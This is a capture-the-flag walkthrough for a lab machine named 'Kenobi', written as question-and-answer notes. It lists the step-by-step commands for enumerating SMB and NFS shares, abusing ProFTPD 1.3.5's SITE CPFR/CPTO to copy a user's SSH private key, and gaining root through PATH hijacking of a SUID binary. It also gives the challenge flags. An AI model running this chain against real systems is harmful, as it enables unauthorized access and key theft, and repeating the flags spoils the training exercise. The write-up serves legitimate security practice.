
							       Kenobi 
							      ========
	
							      Questions
							     ===========

						[Task 1] Deploy the vulnerable machine 
						---------------------------------------

1. Make sure you're connected to our network and deploy the machine
ans: auto-complete

2. Scan the machine with nmap, how many ports are open?
ans: 7
command: nmap -v -A 10.10.17.195 > nmap.txt


						[Task 2] Enumerating Samba for shares 
						-------------------------------------

1. Using the nmap command above, how many shares have been found?
ans: 3
command: nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.17.195 > ./nmap/nmap_smb_shares.txt

2. What is the file can you see?
ans: log.txt
command: smbclient //10.10.17.195/anonymous

3. What port is FTP running on?
ans: 21

4. What mount can we see?
ans: /var
command: nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.17.195 > ./nmap/nmap_mount.txt

						[Task 3] Gain initial access with ProFtpd
						-----------------------------------------

1. What is the version?
ans: 1.3.5 (nmap.txt)

2. How many exploits are there for the ProFTPd running?
ans:  3
command: searchsploit proftp | grep -E "1.3.5"

3. We know that the FTP service is running as the Kenobi user (from the file on the share) and an ssh key is generated for that user.
ans: auto-complete

4. We knew that the /var directory was a mount we could see (task 2, question 4). 
   So we've now moved Kenobi's private key to the /var/tmp directory.
ans: auto-complete

5. What is Kenobi's user flag 
ans: d0b0f3f53b6caa532a83915e19224899
command: nc 10.10.17.195 21
command: SITE CPFR /home/kenobi/.ssh/id_rsa
command: SITE CPTO /var/tmp/id_rsa
command: mkdir mount
command: cd mount
command: mount 10.10.17.195:/var .
command: ls -al
command: cp ./mount/tmp/id_rsa .
command: chmod 600 id_rsa 
command: ssh -i id_rsa kenobi@10.10.17.195
command: cat user.txt

						[Task 4] Privilege Escalation with Path Variable Manipulation 
						--------------------------------------------------------------
							
1. What file looks particularly out of the ordinary? 
ans: /usr/bin/menu
command: find / -perm -u=s -type f 2>/dev/null

2. Run the binary, how many options appear?
ans: 3
command: menu

3. 
ans: auto-complete

4. What is the root flag (/root/root.txt)?
ans: 177b3cd8562289f37382721c28381f02
command: strings /usr/bin/menu
command: cd /tmp
command: echo /bin/sh > curl
command: chmod 777 curl
command: export PATH=/tmp:$PATH
command: menu (select 1)
command: id (uid=0(root) gid=1000(kenobi) groups=1000(kenobi))
command: cat /root/root.txt
